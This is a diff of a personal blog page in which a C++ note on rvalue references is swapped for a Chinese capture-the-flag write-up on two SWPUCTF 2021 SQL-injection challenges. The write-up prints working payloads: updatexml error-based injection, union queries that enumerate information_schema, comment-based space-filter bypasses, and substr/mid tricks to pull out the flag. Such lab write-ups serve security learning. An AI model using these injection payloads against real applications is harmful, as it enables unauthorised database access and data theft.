@@ -16,24 +16,40 @@
   <meta name="author" content="August Rosenberg">
   <meta name="keywords" content="">
   
-    <meta name="description" content="[TOC] 右值和左值右值左值的区分 能取地址的是左值，不能取地址的是右值  实例 1234567891011int main()&amp;#123;    &#x2F;&#x2F;左值    int lvalue&#x3D;244;    &#x2F;&#x2F;左值引用    int &amp;lvalueCite&#x3D;lvalue;    &#x2F;&#x2F;右值    &#x2F;&#x2F;右值引用    int &amp;&amp;rvalueCite&#x3D;6;&amp;#125;  使用右值">
+    <meta name="description" content="[SWPUCTF 2021 新生赛]error0x00 看提示感觉像是一个sql注入  0x01 先输入一个1，看看是post 还是get  是get，那我们就使用hackbar 0x02 判断字符型还是数字型 输入1 不报错 输入1&#96; 报错  所以是字符型 0x03 根据提示，这个是报错注入，使用updatexml()函数 然后就是联合注入的一部分  0x04 1231&amp;#x27; un">
 <meta property="og:type" content="article">
-<meta property="og:title" content="右值和左值">
-<meta property="og:url" content="https://tsy244.github.io/2023/03/26/c++/%E5%8F%B3%E5%80%BC%E5%92%8C%E5%B7%A6%E5%80%BC/index.html">
+<meta property="og:title" content="sql">
+<meta property="og:url" content="https://tsy244.github.io/2024/01/07/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/WEB/sql/index.html">
 <meta property="og:site_name" content="AU9U5T">
-<meta property="og:description" content="[TOC] 右值和左值右值左值的区分 能取地址的是左值，不能取地址的是右值  实例 1234567891011int main()&amp;#123;    &#x2F;&#x2F;左值    int lvalue&#x3D;244;    &#x2F;&#x2F;左值引用    int &amp;lvalueCite&#x3D;lvalue;    &#x2F;&#x2F;右值    &#x2F;&#x2F;右值引用    int &amp;&amp;rvalueCite&#x3D;6;&amp;#125;  使用右值">
+<meta property="og:description" content="[SWPUCTF 2021 新生赛]error0x00 看提示感觉像是一个sql注入  0x01 先输入一个1，看看是post 还是get  是get，那我们就使用hackbar 0x02 判断字符型还是数字型 输入1 不报错 输入1&#96; 报错  所以是字符型 0x03 根据提示，这个是报错注入，使用updatexml()函数 然后就是联合注入的一部分  0x04 1231&amp;#x27; un">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2023-03-26T12:39:43.000Z">
-<meta property="article:modified_time" content="2023-04-10T14:33:38.576Z">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/rce/image-20240107224511477.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/rce/image-20240107224549868.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/rce/image-20240107224748676.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/rce/image-20240107225111406.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/rce/image-20240107225459059.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/rce/image-20240107230238888.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/sql/image-20240109131147652.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/sql/image-20240109131500740.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/sql/image-20240109131609419.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/sql/image-20240109131831661.png">
+<meta property="og:image" content="d:\hexo\source_posts\CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95\WEB\sql.assets\image-20240109132010921.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/sql/image-20240109132011437.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/sql/image-20240109132231829.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/sql/image-20240109132346261.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/sql/image-20240109133120413.png">
+<meta property="article:published_time" content="2024-01-07T14:43:30.000Z">
+<meta property="article:modified_time" content="2024-01-09T05:31:24.130Z">
 <meta property="article:author" content="August Rosenberg">
-<meta property="article:tag" content="c++基础">
+<meta property="article:tag" content="CTF刷题记录">
 <meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/rce/image-20240107224511477.png">
   
   
     <meta name="referrer" content="no-referrer-when-downgrade">
   
   
-  <title>右值和左值 - AU9U5T</title>
+  <title>sql - AU9U5T</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -199,7 +215,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="右值和左值"></span>
+            <span id="subtitle" data-typed-text="sql"></span>
           
         </div>
 
@@ -215,8 +231,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2023-03-26 20:39" pubdate>
-          March 26, 2023 pm
+        <time datetime="2024-01-07 22:43" pubdate>
+          January 7, 2024 pm
         </time>
       </span>
     
@@ -227,7 +243,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          1.2k words
+          1.5k words
         
       </span>
     
@@ -238,7 +254,7 @@
         
         
         
-          10 mins
+          13 mins
         
       </span>
     
@@ -276,29 +292,77 @@
         <div id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">右值和左值</h1>
+            <h1 style="display: none">sql</h1>
             
             
               <div class="markdown-body">
                 
-                <p>[TOC]</p>
-<h1 id="右值和左值"><a href="#右值和左值" class="headerlink" title="右值和左值"></a>右值和左值</h1><h2 id="右值左值的区分"><a href="#右值左值的区分" class="headerlink" title="右值左值的区分"></a>右值左值的区分</h2><ol>
-<li><p>能取地址的是左值，不能取地址的是右值</p>
-</li>
-<li><p>实例</p>
-<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">//左值</span><br>    <span class="hljs-type">int</span> lvalue=<span class="hljs-number">244</span>;<br>    <span class="hljs-comment">//左值引用</span><br>    <span class="hljs-type">int</span> &amp;lvalueCite=lvalue;<br>    <span class="hljs-comment">//右值</span><br>    <span class="hljs-comment">//右值引用</span><br>    <span class="hljs-type">int</span> &amp;&amp;rvalueCite=<span class="hljs-number">6</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
-</li>
-<li><p>使用右值引用延长生命周期</p>
-</li>
+                <h1 id="SWPUCTF-2021-新生赛-error"><a href="#SWPUCTF-2021-新生赛-error" class="headerlink" title="[SWPUCTF 2021 新生赛]error"></a>[SWPUCTF 2021 新生赛]error</h1><p><strong>0x00</strong></p>
+<p>看提示感觉像是一个sql注入</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/rce/image-20240107224511477.png" srcset="/img/loading.gif" lazyload alt="image-20240107224511477"></p>
+<p><strong>0x01</strong></p>
+<p>先输入一个1，看看是post 还是get</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/rce/image-20240107224549868.png" srcset="/img/loading.gif" lazyload alt="image-20240107224549868"></p>
+<p>是get，那我们就使用hackbar</p>
+<p><strong>0x02</strong></p>
+<p>判断字符型还是数字型</p>
+<p>输入1 不报错</p>
+<p>输入1&#96; 报错</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/rce/image-20240107224748676.png" srcset="/img/loading.gif" lazyload alt="image-20240107224748676"></p>
+<p>所以是字符型</p>
+<p><strong>0x03</strong></p>
+<p>根据提示，这个是报错注入，使用updatexml()函数</p>
+<p>然后就是联合注入的一部分</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/rce/image-20240107225111406.png" srcset="/img/loading.gif" lazyload alt="image-20240107225111406"></p>
+<p><strong>0x04</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mysql">1&#x27; union select updatexml(0x7e,concat(&#x27;~&#x27;,(select database())),0x7e) --+ <br>1&#x27; union select updatexml(0x7e,concat(&#x27;~&#x27;,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;test_db&#x27; )),0x7e) --+ <br>1&#x27; union select updatexml(0x7e,concat(&#x27;~&#x27;,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;test_tb&#x27; )),0x7e) --+ <br></code></pre></td></tr></table></figure>
+
+<p>最后确定是test_db.test_tb的flag列</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/rce/image-20240107225459059.png" srcset="/img/loading.gif" lazyload alt="image-20240107225459059"></p>
+<p>发现不能显示完，我们使用substr()控制一下</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="http://node4.anna.nssctf.cn:28736/index.php?id=1">http://node4.anna.nssctf.cn:28736/index.php?id=1</a>‘ union select updatexml(0x7e,concat(‘~’,substr((select flag from test_db.test_tb ),30,40)),0x7e) –+ </p>
+</blockquote>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/rce/image-20240107230238888.png" srcset="/img/loading.gif" lazyload alt="image-20240107230238888"></p>
+<h1 id="SWPUCTF-2021-新生赛-sql"><a href="#SWPUCTF-2021-新生赛-sql" class="headerlink" title="[SWPUCTF 2021 新生赛]sql"></a>[SWPUCTF 2021 新生赛]sql</h1><p><strong>0x00</strong> </p>
+<p>这个的重点是空格绕过，也就是想办法绕过空格</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/sql/image-20240109131147652.png" srcset="/img/loading.gif" lazyload alt="image-20240109131147652"></p>
+<p>注意参数，然后开始尝试，发现1是可以执行的</p>
+<p><strong>0x01</strong></p>
+<p>然后我尝试判断是什么类型</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/sql/image-20240109131500740.png" srcset="/img/loading.gif" lazyload alt="image-20240109131500740"></p>
+<p>一个引号出现了 问题，但是两个没有问题，所以判断是字符型，然后尝试获取显示位</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/sql/image-20240109131609419.png" srcset="/img/loading.gif" lazyload alt="image-20240109131609419"></p>
+<p>非法操作，在这个地方出现错误，我先想到有两种</p>
+<blockquote>
+<ol>
+<li>空格绕过</li>
+<li>注释</li>
 </ol>
-<h2 id="移动构造函数"><a href="#移动构造函数" class="headerlink" title="移动构造函数"></a>移动构造函数</h2><ol>
-<li><p>作用： 复用其他对象的资源（堆内存）</p>
-</li>
-<li><p>实现浅拷贝 </p>
-<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;iostream&quot;</span></span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">name1</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-comment">//无参构造</span><br>    <span class="hljs-built_in">name1</span>()&#123;<br>        mPtr=<span class="hljs-keyword">new</span> <span class="hljs-type">int</span>;<br>    &#125;<br>    <span class="hljs-comment">//拷贝构造</span><br>    <span class="hljs-built_in">name1</span>(<span class="hljs-type">const</span> name1 &amp;tem)&#123;<br>        <span class="hljs-keyword">this</span>-&gt;mPtr=tem.mPtr;<br>    &#125;<br>    <span class="hljs-comment">//移动构造</span><br>    <span class="hljs-built_in">name1</span>(name1&amp;&amp; tem):<span class="hljs-built_in">mPtr</span>(tem.mPtr)<br>    &#123;<br>        tem.mPtr=<span class="hljs-literal">nullptr</span>;<br><br>    &#125;<br><br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-type">int</span> * mPtr;<br>&#125;;<br><br><span class="hljs-function">name1 <span class="hljs-title">getObj</span><span class="hljs-params">()</span></span>&#123;<br>    name1 name11;<br>    *name11.mPtr=<span class="hljs-number">2</span>;<br>    std::cout&lt;&lt;name11.mPtr&lt;&lt;std::endl;<br>    <span class="hljs-keyword">return</span> name11;<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">//要求右侧是个临时对象，才会调用移动拷贝构造函数</span><br>    <span class="hljs-comment">//如果没有移动拷贝构造函数，就会调用拷贝构造函数</span><br>    name1 obj=<span class="hljs-built_in">getObj</span>();<br>    std::cout&lt;&lt;obj.mPtr&lt;&lt;<span class="hljs-string">&quot; &quot;</span>&lt;&lt;*obj.mPtr&lt;&lt;std::endl;<br>    name1&amp;&amp; obj2=<span class="hljs-built_in">getObj</span>();<br>    std::cout&lt;&lt;obj2.mPtr&lt;&lt;<span class="hljs-string">&quot; &quot;</span>&lt;&lt;*obj2.mPtr&lt;&lt;std::endl;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li>
-</ol>
-<h3 id="move"><a href="#move" class="headerlink" title="move"></a>move</h3><p>使用std::move方法可以将左值转换为右值。使用这个函数并不能移动任何东西，而是和移动构造函数一样都具有移动语义，将对象的状态或者所有权从一个对象转移到另一个对象，只是转移，没有内存拷贝。</p>
-<h3 id="forward"><a href="#forward" class="headerlink" title="forward"></a>forward</h3><p>右值引用类型是独立于值的，一个右值引用作为函数参数的形参时，在函数内部转发该参数给内部其他函数时，它就变成一个左值，并不是原来的类型了。如果需要按照参数原来的类型转发到另一个函数，可以使用 C++11 提供的 std::forward () 函数，该函数实现的功能称之为完美转发。</p>
+</blockquote>
+<p>为了方便，我一下用了两种</p>
+<blockquote>
+<p>?wllm&#x3D;1’&#x2F;<strong>&#x2F;order&#x2F;</strong>&#x2F;by&#x2F;**&#x2F;4%23</p>
+</blockquote>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/sql/image-20240109131831661.png" srcset="/img/loading.gif" lazyload alt="image-20240109131831661"></p>
+<p><img src="D:\hexo\source_posts\CTF刷题记录\WEB\sql.assets\image-20240109132010921.png" srcset="/img/loading.gif" lazyload alt="image-20240109132010921"><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/sql/image-20240109132011437.png" srcset="/img/loading.gif" lazyload alt="image-20240109132011437"></p>
+<p><strong>0x02</strong></p>
+<p>然后就是联合查询那些，一直到获取列的元素</p>
+<blockquote>
+<p>-1’union&#x2F;<strong>&#x2F;1,<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=group_concat&spm=1001.2101.3001.7020">group_concat</a>(table_name),3&#x2F;</strong>&#x2F;from&#x2F;<strong>&#x2F;information_schema.tables&#x2F;</strong>&#x2F;where&#x2F;<strong>&#x2F;table_schema&#x2F;</strong>&#x2F;like(database())%23</p>
+<p>-1’union&#x2F;<strong>&#x2F;select&#x2F;</strong>&#x2F;1,group_concat(column_name),3&#x2F;<strong>&#x2F;from&#x2F;</strong>&#x2F;information_schema.columns&#x2F;<strong>&#x2F;where&#x2F;</strong>&#x2F;table_name&#x2F;**&#x2F;like(“LTLT_flag”)%23</p>
+<p>-1’union&#x2F;<strong>&#x2F;select&#x2F;</strong>&#x2F;1,database(),flag&#x2F;<strong>&#x2F;from&#x2F;</strong>&#x2F;LTLT_flag%23</p>
+</blockquote>
+<p>发现出现了问题<img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/sql/image-20240109132231829.png" srcset="/img/loading.gif" lazyload alt="image-20240109132231829"></p>
+<p>遇到这个问题，我首先想到的是，使用<code>substr</code></p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/sql/image-20240109132346261.png" srcset="/img/loading.gif" lazyload alt="image-20240109132346261"></p>
+<p>猜测可能把substr禁止了，所以尝试使用其他的方法</p>
+<blockquote>
+<p>letf()</p>
+<p>right()</p>
+<p>mid()</p>
+</blockquote>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/sql/image-20240109133120413.png" srcset="/img/loading.gif" lazyload alt="image-20240109133120413"></p>
 
                 
               </div>
@@ -311,7 +375,7 @@
     <div class="post-meta">
       <i class="iconfont icon-tags"></i>
       
-        <a href="/tags/c-%E5%9F%BA%E7%A1%80/">#c++基础</a>
+        <a href="/tags/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/">#CTF刷题记录</a>
       
     </div>
   
@@ -323,8 +387,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>右值和左值</div>
-      <div>https://tsy244.github.io/2023/03/26/c++/右值和左值/</div>
+      <div>sql</div>
+      <div>https://tsy244.github.io/2024/01/07/CTF刷题记录/WEB/sql/</div>
     </div>
     <div class="license-meta">
       
@@ -336,7 +400,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>Posted on</div>
-          <div>March 26, 2023</div>
+          <div>January 7, 2024</div>
         </div>
       
       
@@ -368,15 +432,15 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2023/03/26/c++/%E5%8F%AF%E8%B0%83%E7%94%A8%E5%AF%B9%E8%B1%A1%E5%8C%85%E8%A3%85%E5%99%A8/" title="可调用对象包装器">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">可调用对象包装器</span>
-                        <span class="visible-mobile">Previous</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
+                    
+                      <a href="/2024/01/07/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/WEB/md5/" title="md5">
+                        <span class="hidden-mobile">md5</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
                     
                   </article>
                 </div>
